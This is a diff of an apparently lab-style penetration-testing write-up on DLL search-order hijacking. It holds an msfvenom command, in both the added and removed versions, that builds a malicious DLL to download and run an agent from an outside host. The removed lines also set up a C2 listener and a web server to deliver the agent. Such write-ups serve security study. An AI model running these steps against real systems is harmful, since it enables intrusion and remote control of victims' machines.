@@ -561,32 +561,7 @@ Because of DLL search order i can craft a malicious dll then place it in the sam
 
 # Malicious DLL creation
 ```python
-msfvenom -a x86 -p windows/download_exec EXE=agent.x64.exe URL=http://10.200.50.211:8000/agent.x64.exe -f dll -o dismcore.dll
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-No encoder specified, outputting raw payload
-Payload size: 457 bytes
-Final size of dll file: 9216 bytes
-Saved as: dismcore.dll
+msfvenom -a x64 -p windows/download_exec EXE=agent.x64.exe URL=http://10.200.50.211:8000/agent.x64.exe -f dll -o dismcore.dll
 ```
-This generated the payload but this probably will not work becuase of defender so i may have to use some encodings to b
-
-Next thing ill do is start adaptix C2 then set a listener
-
-![](Pasted%20image%2020260424210253.png)
-
-Now the listener is set i can generate the agent from this 
-
-![451](Pasted%20image%2020260424210339.png)
-
-Now i have the agent set i can now setup a python webserver to host the agent and it needs to be port 8000 because of the URL specified in msfvenom
-
-```python
-python3 -m http.server 8000                             
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-Now the agent is being hosted everything is set i can upload the dll to the smb share
 
 
-```python
-
-```
